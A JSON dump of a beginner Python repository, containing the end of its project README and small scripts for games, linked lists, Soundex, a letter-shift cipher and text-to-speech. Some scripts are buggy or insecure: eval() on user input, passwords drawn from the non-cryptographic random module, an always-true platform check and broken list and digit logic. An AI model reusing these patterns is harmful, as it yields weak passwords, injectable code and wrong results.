MAC address, generate a random MAC address, or enter input as a new MAC address on Linux (Successfully Tested in Ubuntu 18.04).\n35. [whatsapp-monitor.py](https://github.com/geekcomputers/Python/blob/master/whatsapp-monitor.py) - Use Selenium to give online status updates about your contacts in WhatsApp on the terminal.\n36. [whatsapp-chat-analyzer.py](https://github.com/subahanii/whatsapp-Chat-Analyzer) - WhatsApp group/individual chat analyzer that visualizes chat activity using matplotlib.\n37. [JARVIS.py](https://git.io/fjH8m) - Control Windows programs with your voice.\n38. [Images Downloader](https://git.io/JvnJh) - Download images from webpages on Unix-based systems.\n39. [space_invader.py.py](https://github.com/meezan-mallick/space_invader_game) - Classical 2D space invader game to recall your childhood memories.\n40. [Test Case Generator](https://github.com/Tanmay-901/test-case-generator/blob/master/test_case.py) - Generate different types of test cases with a clean and friendly UI, used in competitive programming and software testing.\n41. [Extract Thumbnail From Video](https://github.com/geekcomputers/Python/tree/ExtractThumbnailFromVideo) - Extract Thumbnail from video files\n42. [How to begin the journey of open source (first contribution)](https://www.youtube.com/watch?v=v2X51AVgl3o) - First Contribution of open source\n<hr>\n\n_**Note**: The content in this repository belongs to the respective authors and creators. I'm just providing a formatted README.md for better presentation._\n"
        },
        {
          "name": "Random Password Generator.py",
          "type": "blob",
          "size": 0.19921875,
          "content": "import random\n\nlow=\"abcdefghijklmnopqrstuvwxyz\"\nupp=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nnum=\"0123456789\"\nsym=\"!@#$%^&*\"\n\nall=low+upp+num+sym\nlength=8\npassword=\"\".join(random.sample(all,length))\nprint(password)\n\n"
        },
        {
          "name": "RandomDice.py",
          "type": "blob",
          "size": 0.51171875,
          "content": "# GGearing 01/10/19\n# Random Dice Game using Tkinter\n# Tkinter is used for Making Using GUI in Python Program!\n# randint provides you with a random number within your given range!\nfrom random import randint\nfrom tkinter import *\n\n# Function to rool the dice\ndef roll():\n    text.delete(0.0, END)\n    text.insert(END, str(randint(1, 100)))\n\n\n# Defining our GUI\nwindow = Tk()\ntext = Text(window, width=3, height=1)\nbuttonA = Button(window, text=\"Press to roll!\", command=roll)\ntext.pack()\nbuttonA.pack()\n# End Of The Program!\n"
        },
        {
          "name": "RandomNumberGame.py",
          "type": "blob",
          "size": 1.814453125,
          "content": "\"\"\"\n  hey everyone it is a basic game code using random . in this game computer will randomly chose an number from 1 to 100 and players will have \n  to guess that which number it is and game will tell him on every guss whether his/her guess is smaller or bigger than the chosen number. it is \n  a multi player game so it can be played with many players there is no such limitations of user till the size of list. if any one wants to modify \n  this game he/she is most welcomed.\n    Thank you\n\"\"\"\n\nimport os\nimport random\n\nplayers = []\nscore = []\n\nprint(\n    \"\\n\\tRandom Number Game\\n\\nHello Everyone ! it is just a game of chance in which you have to guess a number\"\n    \" from 0 to 100 and computer will tell whether your guess is smaller or bigger than the acctual number chossen by the computer . \"\n    \"the person with less attempts in guessing the number will be winner .\"\n)\nx = input()\nos.system(\"cls\")\n\nn = int(input(\"Enter number of players : \"))\nprint()\n\nfor i in range(0, n):\n    name = input(\"Enter name of player : \")\n    players.append(name)\n\nos.system(\"cls\")\n\nfor i in range(0, n):\n    orignum = random.randint(1, 100)\n    print(players[i], \"your turn :\", end=\"\\n\\n\")\n    count = 0\n    while True:\n        ch = int(input(\"Please enter your guess : \"))\n        if ch > orignum:\n            print(\"no! number is smaller...\")\n            count += 1\n        elif ch == orignum:\n            print(\"\\n\\n\\tcongrats you won\")\n            break\n        else:\n            print(\"nope ! number is large dude...\")\n            count += 1\n    print(\"    you have taken\", count + 1, \"attempts\")\n    x = input()\n    score.append(count + 1)\n    os.system(\"cls\")\nprint(\"players :\\n\")\nfor i in range(0, n):\n    print(players[i], \"-\", score[i])\n\nprint(\"\\n\\nwinner is :\\n\")\nfor i in range(0, n):\n    if score[i] == min(score):\n        print(players[i])\nx = input()\n"
        },
        {
          "name": "Randomnumber.py",
          "type": "blob",
          "size": 0.1298828125,
          "content": "# Program to generate a random number between 0 and 9\n\n# importing the random module\nfrom random import randint\n\nprint(randint(0,9))\n"
        },
        {
          "name": "ReadFromCSV.py",
          "type": "blob",
          "size": 0.74609375,
          "content": "__author__ = \"vamsi\"\r\nimport pandas as pd  # pandas library to read csv file\r\nfrom matplotlib import pyplot as plt  # matplotlib library to visualise the data\r\nfrom matplotlib import style\r\n\r\nstyle.use(\"ggplot\")\r\n\r\n\"\"\"reading data from SalesData.csv file\r\n    and passing data to dataframe\"\"\"\r\n\r\ndf = pd.read_csv(\"..\\SalesData.csv\")  # Reading the csv file\r\nx = df[\r\n    \"SalesID\"\r\n].as_matrix()  # casting SalesID to list #extracting the column with name SalesID\r\ny = df[\"ProductPrice\"].as_matrix()  # casting ProductPrice to list\r\nplt.xlabel(\"SalesID\")  # assigning X-axis label\r\nplt.ylabel(\"ProductPrice\")  # assigning Y-axis label\r\nplt.title(\"Sales Analysis\")  # assigning Title to the graph\r\nplt.plot(x, y)  # Plot X and Y axis\r\nplt.show()  # Show the graph\r\n"
        },
        {
          "name": "Recursion Visulaizer",
          "type": "tree",
          "content": null
        },
        {
          "name": "Reverse_list_in_groups.py",
          "type": "blob",
          "size": 1.4716796875,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Reverse_Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Insert_At_End(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        current = self.head\r\n        while current.next:\r\n            current = current.next\r\n        current.next = new_node\r\n\r\n    def Reverse_list_Groups(self, head, k):\r\n        count = 0\r\n        previous = None\r\n        current = head\r\n        while current is not None and count < k:\r\n            following = current.next\r\n            current.next = previous\r\n            previous = current\r\n            current = following\r\n            count += 1\r\n        if following is not None:\r\n            head.next = self.Reverse_list_Groups(following, k)\r\n        return previous\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        print(\"None\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    L_list = Reverse_Linked_List()\r\n    L_list.Insert_At_End(1)\r\n    L_list.Insert_At_End(2)\r\n    L_list.Insert_At_End(3)\r\n    L_list.Insert_At_End(4)\r\n    L_list.Insert_At_End(5)\r\n    L_list.Insert_At_End(6)\r\n    L_list.Insert_At_End(7)\r\n    L_list.Display()\r\n    L_list.head = L_list.Reverse_list_Groups(L_list.head, 2)\r\n    print(\"\\nReverse Linked List: \")\r\n    L_list.Display()\r\n"
        },
        {
          "name": "Rotate_Linked_List.py",
          "type": "blob",
          "size": 1.48828125,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Insert_At_Beginning(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        new_node.next = self.head\r\n        self.head = new_node\r\n\r\n    def Rotation(self, key):\r\n        if key == 0:\r\n            return\r\n        current = self.head\r\n        count = 1\r\n        while count < key and current is not None:\r\n            current = current.next\r\n            count += 1\r\n        if current is None:\r\n            return\r\n        Kth_Node = current\r\n        while current.next is not None:\r\n            current = current.next\r\n        current.next = self.head\r\n        self.head = Kth_Node.next\r\n        Kth_Node.next = None\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        print(\"None\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    L_list = Linked_List()\r\n    L_list.Insert_At_Beginning(8)\r\n    L_list.Insert_At_Beginning(5)\r\n    L_list.Insert_At_Beginning(10)\r\n    L_list.Insert_At_Beginning(7)\r\n    L_list.Insert_At_Beginning(6)\r\n    L_list.Insert_At_Beginning(11)\r\n    L_list.Insert_At_Beginning(9)\r\n    print(\"Linked List Before Rotation: \")\r\n    L_list.Display()\r\n    print(\"Linked List After Rotation: \")\r\n    L_list.Rotation(4)\r\n    L_list.Display()\r\n"
        },
        {
          "name": "SOUNDEX.py",
          "type": "blob",
          "size": 2.28515625,
          "content": "# -*- coding: utf-8 -*-\n\n\ndef SOUNDEX(TERM: str):\n\n    # Step 0: Covert the TERM to UpperCase\n    TERM = TERM.upper()\n    TERM_LETTERS = [char for char in TERM if char.isalpha()]\n\n    # List the Remove occurrences of A, E, I, O, U, Y, H, W.\n    Remove_List = (\"A\", \"E\", \"I\", \"O\", \"U\", \"Y\", \"H\", \"W\")\n    # Save the first letter\n    first_letter = TERM_LETTERS[0]\n    # Take the Other letters instead of First_Letter\n    Characters = TERM_LETTERS[1:]\n    # Remove items from Character using Remove_List\n    Characters = [\n        To_Characters\n        for To_Characters in Characters\n        if To_Characters not in Remove_List\n    ]\n\n    # if len(Characters) == 0:\n    #    return first_letter + \"000\"\n\n    # Replace all the Characters with Numeric Values (instead of the first letter) with digits according to Soundex Algorythem Ruels\n    Replace_List = {\n        (\"B\", \"F\", \"P\", \"V\"): 1,\n        (\"C\", \"G\", \"J\", \"K\", \"Q\", \"S\", \"X\", \"Z\"): 2,\n        (\"D\", \"T\"): 3,\n        (\"L\"): 4,\n        (\"M\", \"N\"): 5,\n        (\"R\"): 6,\n    }\n    Characters = [\n        value if char else char\n        for char in Characters\n        for group, value in Replace_List.items()\n        if char in group\n    ]\n\n    # Step 3: Replace all adjacent same number with one number\n    Characters = [\n        char\n        for Letter_Count, char in enumerate(Characters)\n        if (\n            Letter_Count == len(Characters) - 1\n            or (\n                Letter_Count + 1 < len(Characters)\n                and char != Characters[Letter_Count + 1]\n            )\n        )\n    ]\n\n    # If the saved Characters’s Number is the same the resulting First Letter,keep the First Letter AND remove the Number\n    if len(TERM_LETTERS) != 1:\n        if first_letter == TERM_LETTERS[1]:\n            Characters[0] = TERM[0]\n        else:\n            Characters.insert(0, first_letter)\n\n    # If the Number of Characters are less than 4 insert 3 zeros to Characters\n    # Remove all except first letter and 3 digits after it.\n    # first_letter = Characters[0]\n    # Characters = Characters[1:]\n\n    # Characters = [char for char in Characters if isinstance(char, int)][0:3]\n    while len(Characters) < 4:\n        Characters.append(0)\n    if len(Characters) > 4:\n        Characters = Characters[0:4]\n\n    INDEX = \"\".join([str(C) for C in Characters])\n    return INDEX\n"
        },
        {
          "name": "Search_Engine",
          "type": "tree",
          "content": null
        },
        {
          "name": "Secret message generator GUI by tkinter.py",
          "type": "blob",
          "size": 3.7470703125,
          "content": "import tkinter\n\nroot = tkinter.Tk()\nroot.geometry(\"360x470\")\nroot.title(\"SECRET MESSAGE CODER DECODER\")\n\nname1 = tkinter.StringVar()\nname2 = tkinter.StringVar()\nresult1 = tkinter.StringVar()\nr1 = tkinter.Label(\n    root,\n    text=\"\",\n    textvariable=result1,\n    fg=\"green\",\n    bg=\"white\",\n    font=(\"lucida handwriting\", 15, \"bold\", \"underline\"),\n)\nr1.place(x=10, y=150)\nresult2 = tkinter.StringVar()\nr2 = tkinter.Label(\n    root,\n    text=\"\",\n    textvariable=result2,\n    fg=\"green\",\n    bg=\"white\",\n    font=(\"lucida handwriting\", 15, \"bold\", \"underline\"),\n)\nr2.place(x=0, y=380)\na = tkinter.Entry(\n    root,\n    text=\"\",\n    textvariable=name1,\n    bd=5,\n    bg=\"light grey\",\n    fg=\"red\",\n    font=(\"bold\", 20),\n)\na.place(x=0, y=50)\nb = tkinter.Entry(\n    root,\n    text=\"\",\n    textvariable=name2,\n    bd=5,\n    bg=\"light grey\",\n    fg=\"red\",\n    font=(\"bold\", 20),\n)\nb.place(x=0, y=270)\nt1 = tkinter.Label(\n    root, text=\"TYPE MESSAGE:\", font=(\"arial\", 20, \"bold\", \"underline\"), fg=\"red\"\n)\nt2 = tkinter.Label(\n    root, text=\"TYPE SECRET MESSAGE:\", font=(\"arial\", 20, \"bold\", \"underline\"), fg=\"red\"\n)\nt1.place(x=10, y=0)\nt2.place(x=10, y=220)\n\n\ndef show1():\n    data1 = name1.get()\n    codes = {\n        \"b\": \"a\",\n        \"c\": \"b\",\n        \"d\": \"c\",\n        \"e\": \"d\",\n        \"f\": \"e\",\n        \"g\": \"f\",\n        \"h\": \"g\",\n        \"i\": \"h\",\n        \"j\": \"i\",\n        \"k\": \"j\",\n        \"l\": \"k\",\n        \"m\": \"l\",\n        \"n\": \"m\",\n        \"o\": \"n\",\n        \"p\": \"o\",\n        \"q\": \"p\",\n        \"r\": \"q\",\n        \"s\": \"r\",\n        \"t\": \"s\",\n        \"u\": \"t\",\n        \"v\": \"u\",\n        \"w\": \"v\",\n        \"x\": \"w\",\n        \"y\": \"x\",\n        \"z\": \"y\",\n        \"a\": \"z\",\n        \" \": \" \",\n        \"B\": \"A\",\n        \"C\": \"B\",\n        \"D\": \"C\",\n        \"E\": \"D\",\n        \"F\": \"E\",\n        \"G\": \"F\",\n        \"H\": \"G\",\n        \"I\": \"H\",\n        \"J\": \"I\",\n        \"K\": \"J\",\n        \"L\": \"K\",\n        \"M\": \"L\",\n        \"N\": \"M\",\n        \"O\": \"N\",\n        \"P\": \"O\",\n        \"Q\": \"P\",\n        \"R\": \"Q\",\n        \"S\": \"R\",\n        \"T\": \"S\",\n        \"U\": \"T\",\n        \"V\": \"U\",\n        \"W\": \"V\",\n        \"X\": \"W\",\n        \"Y\": \"X\",\n        \"Z\": \"Y\",\n        \"A\": \"Z\",\n    }\n    lol1 = \"\"\n    for x in data1:\n        lol1 = lol1 + codes[x]\n    name1.set(\"\")\n    result1.set(\"SECRET MESSAGE IS:-\\n\" + lol1)\n    return\n\n\nbt1 = tkinter.Button(\n    root,\n    text=\"OK\",\n    bg=\"white\",\n    fg=\"black\",\n    bd=5,\n    command=show1,\n    font=(\"calibri\", 15, \"bold\", \"underline\"),\n)\nbt1.place(x=10, y=100)\n\n\ndef show2():\n    data2 = name2.get()\n    codes = {\n        \"a\": \"b\",\n        \"b\": \"c\",\n        \"c\": \"d\",\n        \"d\": \"e\",\n        \"e\": \"f\",\n        \"f\": \"g\",\n        \"g\": \"h\",\n        \"h\": \"i\",\n        \"i\": \"j\",\n        \"j\": \"k\",\n        \"k\": \"l\",\n        \"l\": \"m\",\n        \"m\": \"n\",\n        \"n\": \"o\",\n        \"o\": \"p\",\n        \"p\": \"q\",\n        \"q\": \"r\",\n        \"r\": \"s\",\n        \"s\": \"t\",\n        \"t\": \"u\",\n        \"u\": \"v\",\n        \"v\": \"w\",\n        \"w\": \"x\",\n        \"x\": \"y\",\n        \"y\": \"z\",\n        \"z\": \"a\",\n        \" \": \" \",\n        \"A\": \"B\",\n        \"B\": \"C\",\n        \"C\": \"D\",\n        \"D\": \"E\",\n        \"E\": \"F\",\n        \"F\": \"G\",\n        \"G\": \"H\",\n        \"H\": \"I\",\n        \"I\": \"J\",\n        \"J\": \"K\",\n        \"K\": \"L\",\n        \"L\": \"M\",\n        \"M\": \"N\",\n        \"N\": \"O\",\n        \"O\": \"P\",\n        \"P\": \"Q\",\n        \"Q\": \"R\",\n        \"R\": \"S\",\n        \"S\": \"T\",\n        \"T\": \"U\",\n        \"U\": \"V\",\n        \"V\": \"W\",\n        \"W\": \"X\",\n        \"X\": \"Y\",\n        \"Y\": \"Z\",\n        \"Z\": \"A\",\n    }\n    lol2 = \"\"\n    for x in data2:\n        lol2 = lol2 + codes[x]\n    name2.set(\"\")\n    result2.set(\"MESSAGE IS:-\\n\" + lol2)\n    return\n\n\nbt2 = tkinter.Button(\n    root,\n    text=\"OK\",\n    bg=\"white\",\n    fg=\"black\",\n    bd=5,\n    command=show2,\n    font=(\"calibri\", 15, \"bold\", \"underline\"),\n)\nbt2.place(x=10, y=320)\nroot.mainloop()\n"
        },
        {
          "name": "Shortest Distance between Two Lines.py",
          "type": "blob",
          "size": 0.544921875,
          "content": "import math\nimport numpy as NP\n\nLC1 = eval(input(\"Enter DRs of Line 1 : \"))\nLP1 = eval(input(\"Enter Coordinate through which Line 1 passes : \"))\nLC2 = eval(input(\"Enter DRs of Line 2 : \"))\nLP2 = eval(input(\"Enter Coordinate through which Line 2 passes : \"))\na1, b1, c1, a2, b2, c2 = LC1[0], LC1[1], LC1[2], LC2[0], LC2[1], LC2[2]\nx = NP.array(\n    [[LP2[0] - LP1[0], LP2[1] - LP1[1], LP2[2] - LP1[2]], [a1, b1, c1], [a2, b2, c2]]\n)\ny = math.sqrt(\n    (((b1 * c2) - (b2 * c1)) ** 2)\n    + (((c1 * a2) - (c2 * a1)) ** 2)\n    + (((a1 * b2) - (b1 * a2)) ** 2)\n)\n"
        },
        {
          "name": "SimpleStopWatch.py",
          "type": "blob",
          "size": 0.65625,
          "content": "# Author: OMKAR PATHAK\n# This script helps to build a simple stopwatch application using Python's time module.\n\nimport time\n\nprint(\"Press ENTER to begin, Press Ctrl + C to stop\")\nwhile True:\n    try:\n        input()  # For ENTER. Use raw_input() if you are running python 2.x instead of input()\n        starttime = time.time()\n        print(\"Started\")\n        while True:\n            print(\"Time Elapsed: \", round(time.time() - starttime, 0), \"secs\", end=\"\\r\")\n            time.sleep(1)  # 1 second delay\n    except KeyboardInterrupt:\n        print(\"Stopped\")\n        endtime = time.time()\n        print(\"Total Time:\", round(endtime - starttime, 2), \"secs\")\n        break\n"
        },
        {
          "name": "Snake-Water-Gun-Game.py",
          "type": "blob",
          "size": 5.642578125,
          "content": "\"\"\"\r\nThis is a snake water gun game similar to rock paper scissor\r\nIn this game :\r\nif computer chooses snake and user chooses water, the snake will drink water and computer wins.\r\nIf computer chooses gun and user chooses water, the gun gets drown into water and user wins.\r\nAnd so on for other cases\r\n\"\"\"\r\n\r\n# you can use this code also, see this code is very short in compare to your code\r\n# code starts here\r\n\"\"\"\r\n# Snake || Water || Gun __ Game\r\nimport random\r\ntimes = 10 # times to play game\r\ncomp_choice = [\"s\",\"w\",\"g\"] # output choice for computer\r\nuser_point = 0 # user point is initially marked 0\r\ncomp_point = 0 # computer point is initially marked 0\r\nwhile times >= 1:\r\n    comp_rand = random.choice(comp_choice) # output computer will give\r\n    #\r\n    # print(comp_rand) # checking if the code is working or not\r\n    print(f\"ROUND LEFT = {times}\")\r\n# checking if the input is entered correct or not\r\n    try:\r\n        user_choice = input(\"Enter the input in lowercase ex. \\n (snake- s) (water- w) (gun- w)\\n:- \") # user choice, the user will input\r\n    except Exception as e:\r\n        print(e)\r\n# if input doen't match this will run\r\n    if user_choice != 's' and user_choice != 'w' and user_choice != 'g':\r\n            print(\"Invalid input, try again\\n\")\r\n            continue\r\n# checking the input and calculating score\r\n    if comp_rand == 's':\r\n        if user_choice == 'w':\r\n            comp_point += 1\r\n        elif user_choice == 'g':\r\n            user_point += 1\r\n\r\n    elif comp_rand == 'w':\r\n        if user_choice == 'g':\r\n            comp_point += 1\r\n        elif user_choice == 's':\r\n            user_point += 1\r\n\r\n    elif comp_rand == 'g':\r\n        if user_choice == 's':\r\n            comp_point += 1\r\n        elif user_choice == 'w':\r\n            user_point += 1\r\n\r\n    times -=1 # reducing the number of rounds after each match\r\nif user_point>comp_point: # if user wins\r\n    print(f\"WOOUUH! You have win \\nYour_point = {user_point}\\nComputer_point = {comp_point}\")\r\nelif comp_point>user_point: # if computer wins\r\n    print(f\"WE RESPECT YOUR HARD WORK, BUT YOU LOSE AND YOU ARE A LOSER NOW! \\nYour_point = {user_point}\\nComputer_point = {comp_point}\")\r\nelif comp_point==user_point: # if match draw\r\n    print(f\"MATCH DRAW\\nYour_point = {user_point}\\nComputer_point = {comp_point}\")\r\nelse: # just checked\r\n    print(\"can't calculate score\")\r\nexit = input(\"PRESS ENTER TO EXIT\")\r\n\"\"\"  # code ends here\r\nimport random\r\n\r\n# import time\r\n\r\nchoices = {\"S\": \"Snake\", \"W\": \"Water\", \"G\": \"Gun\"}\r\n\r\nx = 0\r\ncomp_point = 0\r\nuser_point = 0\r\nmatch_draw = 0\r\n\r\nprint(\"Welcome to the Snake-Water-Gun Game\\n\")\r\nprint(\"I am Mr. Computer, We will play this game 10 times\")\r\nprint(\"Whoever wins more matches will be the winner\\n\")\r\n\r\nwhile x < 10:\r\n    print(f\"Game No. {x+1}\")\r\n    for key, value in choices.items():\r\n        print(f\"Choose {key} for {value}\")\r\n\r\n    comp_rand = random.choice(list(choices.keys())).lower()\r\n    user_choice = input(\"\\n----->\").lower()\r\n    print(\"Mr. Computer's choice is : \" + comp_rand)\r\n\r\n    # you can use this code to minimize your writing time for the code\r\n    \"\"\"\r\n    if comp_rand == 's':\r\n        if user_choice == 'w':\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n        elif user_choice == 'g':\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n        else:\r\n            match_draw +=1\r\n\r\n    elif comp_rand == 'w':\r\n        if user_choice == 'g':\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n        elif user_choice == 's':\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n        else:\r\n            match_draw +=1\r\n\r\n    elif comp_rand == 'g':\r\n        if user_choice == 's':\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n        elif user_choice == 'w':\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n        else:\r\n            match_draw +=1\r\n\r\n    \"\"\"\r\n\r\n    if comp_rand == \"s\":\r\n        if user_choice == \"w\":\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n            x += 1\r\n        elif user_choice == \"g\":\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n            x += 1\r\n        else:\r\n            print(\"\\n-------Match draw-------\")\r\n            match_draw += 1\r\n            x += 1\r\n\r\n    elif comp_rand == \"w\":\r\n        if user_choice == \"g\":\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n            x += 1\r\n        elif user_choice == \"s\":\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n            x += 1\r\n        else:\r\n            print(\"\\n-------Match draw-------\")\r\n            match_draw += 1\r\n            x += 1\r\n\r\n    elif comp_rand == \"g\":\r\n        if user_choice == \"s\":\r\n            print(\"\\n-------Mr. Computer won this round--------\")\r\n            comp_point += 1\r\n            x += 1\r\n        elif user_choice == \"w\":\r\n            print(\"\\n-------You won this round-------\")\r\n            user_point += 1\r\n            x += 1\r\n        else:\r\n            print(\"\\n-------Match draw-------\")\r\n            match_draw += 1\r\n            x += 1\r\n\r\nprint(\"Here are final stats of the 10 matches : \")\r\nprint(f\"Mr. Computer won : {comp_point} matches\")\r\nprint(f\"You won : {user_point} matches\")\r\nprint(f\"Matches Drawn : {match_draw}\")\r\n\r\nif comp_point > user_point:\r\n    print(\"\\n-------Mr. Computer won-------\")\r\n\r\nelif comp_point < user_point:\r\n    print(\"\\n-----------You won-----------\")\r\n\r\nelse:\r\n    print(\"\\n----------Match Draw----------\")\r\n"
        },
        {
          "name": "Snake_water_gun",
          "type": "tree",
          "content": null
        },
        {
          "name": "Sorting Algorithims",
          "type": "tree",
          "content": null
        },
        {
          "name": "Sorting Algorithms",
          "type": "tree",
          "content": null
        },
        {
          "name": "Split_Circular_Linked_List.py",
          "type": "blob",
          "size": 1.8291015625,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Circular_Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Push(self, data):\r\n        temp = Node(data)\r\n        temp.next = self.head\r\n        temp1 = self.head\r\n        if self.head is not None:\r\n            while temp1.next is not None:\r\n                temp1 = temp1.next\r\n            temp1.next = temp\r\n        else:\r\n            temp.next = temp\r\n        self.head = temp\r\n\r\n    def Split_List(self, head1, head2):\r\n        if self.head is None:\r\n            return\r\n        slow_ptr = self.head\r\n        fast_ptr = self.head\r\n        while fast_ptr.next != self.head and fast_ptr.next.next != self.head:\r\n            fast_ptr = fast_ptr.next.next\r\n            slow_ptr = slow_ptr.next.next\r\n        if fast_ptr.next.next == self.head:\r\n            fast_ptr = fast_ptr.next\r\n        head1 = self.head\r\n        slow_ptr.next = head1\r\n        if self.head.next != self.head:\r\n            head2.head = slow_ptr.next\r\n        fast_ptr.next = slow_ptr.next\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        if self.head is not None:\r\n            while temp:\r\n                print(temp.data, \"->\", end=\" \")\r\n                temp = temp.next\r\n                if temp == self.head:\r\n                    print(temp.data)\r\n                    break\r\n\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    L_list = Circular_Linked_List()\r\n    head1 = Circular_Linked_List()\r\n    head2 = Circular_Linked_List()\r\n    L_list.Push(6)\r\n    L_list.Push(4)\r\n    L_list.Push(2)\r\n    L_list.Push(8)\r\n    L_list.Push(12)\r\n    L_list.Push(10)\r\n    L_list.Split_List(head1, head2)\r\n    print(\"Circular Linked List: \")\r\n    L_list.Display()\r\n    print(\"Firts Split Linked List: \")\r\n    head1.Display()\r\n    print(\"Second Split Linked List: \")\r\n    head2.Display()\r\n"
        },
        {
          "name": "StringToBinary.py",
          "type": "blob",
          "size": 0.279296875,
          "content": "text = input(\"Enter Text : \")\n\nfor chr in text:\n    bin = \"\"\n    asciiVal = int(ord(chr))\n    while asciiVal > 0:\n        if asciiVal % 2 == 0:\n            bin = bin + \"0\"\n        else:\n            bin = bin + \"1\"\n        asciiVal = int(asciiVal / 2)\n    print(bin + \" : \" + bin[::-1])\n"
        },
        {
          "name": "String_Palindrome.py",
          "type": "blob",
          "size": 0.3583984375,
          "content": "# Program to check if a string is palindrome or not\n\nmy_str = 'aIbohPhoBiA'\n\n# make it suitable for caseless comparison\nmy_str = my_str.casefold()\n\n# reverse the string\nrev_str = reversed(my_str)\n\n# check if the string is equal to its reverse\nif list(my_str) == list(rev_str):\n   print(\"The string is a palindrome.\")\nelse:\n   print(\"The string is not a palindrome.\")\n"
        },
        {
          "name": "Strings.py",
          "type": "blob",
          "size": 0.5654296875,
          "content": "String1 = \"Welcome to Malya's World\"\nprint(\"String with the use of Single Quotes: \")\nprint(String1)\n\n# Creating a String\n# with double Quotes\nString1 = \"I'm a TechGeek\"\nprint(\"\\nString with the use of Double Quotes: \")\nprint(String1)\n\n# Creating a String\n# with triple Quotes\nString1 = '''I'm Malya and I live in a world of \"TechGeeks\"'''\nprint(\"\\nString with the use of Triple Quotes: \")\nprint(String1)\n\n# Creating String with triple\n# Quotes allows multiple lines\nString1 = \"\"\"Smile \n            For \n            Life\"\"\"\nprint(\"\\nCreating a multiline String: \")\nprint(String1)\n"
        },
        {
          "name": "Sum of digits of a number.py",
          "type": "blob",
          "size": 1.458984375,
          "content": "# Python code to calculate the sum of digits of a number, by taking number input from user.\n\nimport sys\n\ndef get_integer():\n    for i in range(3,0,-1):                       # executes the loop 3 times. Giving 3 chances to the user.\n        num = input(\"enter a number:\")\n        if num.isnumeric():                       # checks if entered input is an integer string or not.\n            num = int(num)                        # converting integer string to integer. And returns it to where function is called.\n            return num\n        else:\n            print(\"enter integer only\")                    \n            print(f'{i-1} chances are left' if (i-1)>1 else f'{i-1} chance is left')     # prints if user entered wrong input and chances left.\n        continue   \n        \n\ndef addition(num):\n    Sum=0\n    if type(num) is type(None):               # Checks if number type is none or not. If type is none program exits.\n        print(\"Try again!\")\n        sys.exit()\n    while num > 0:                            # Addition- adding the digits in the number.\n        digit = int(num % 10)\n        Sum += digit\n        num /= 10\n    return Sum                                # Returns sum to where the function is called.\n\n\n\nif __name__ == '__main__':                    # this is used to overcome the problems while importing this file.                         \n    number = get_integer()\n    Sum = addition(number)\n    print(f'Sum of digits of {number} is {Sum}')      # Prints the sum\n"
        },
        {
          "name": "TIC_TAC_TOE",
          "type": "tree",
          "content": null
        },
        {
          "name": "TTS.py",
          "type": "blob",
          "size": 0.796875,
          "content": "from tkinter import *\r\nfrom platform import system\r\n\r\nif system() == \"Windows\" or \"nt\":\r\n    import win32com.client as wincl\r\nelse:\r\n    print(\"Sorry, TTS client is not supported on Linux or MacOS\")\r\n    exit()\r\n\r\n\r\ndef text2Speech():\r\n    text = e.get()\r\n    speak = wincl.Dispatch(\"SAPI.SpVoice\")\r\n    speak.Speak(text)\r\n\r\n\r\n# window configs\r\ntts = Tk()\r\ntts.wm_title(\"Text to Speech\")\r\ntts.geometry(\"225x105\")\r\ntts.config(background=\"#708090\")\r\n\r\nf = Frame(tts, height=280, width=500, bg=\"#bebebe\")\r\nf.grid(row=0, column=0, padx=10, pady=5)\r\nlbl = Label(f, text=\"Enter your Text here : \")\r\nlbl.grid(row=1, column=0, padx=10, pady=2)\r\ne = Entry(f, width=30)\r\ne.grid(row=2, column=0, padx=10, pady=2)\r\nbtn = Button(f, text=\"Speak\", command=text2Speech)\r\nbtn.grid(row=3, column=0, padx=20, pady=10)\r\ntts.mainloop()\r\n"
        },
        {
          "name": "TaskManager.py",
          "type": "blob",
          "size": 0.94140625,
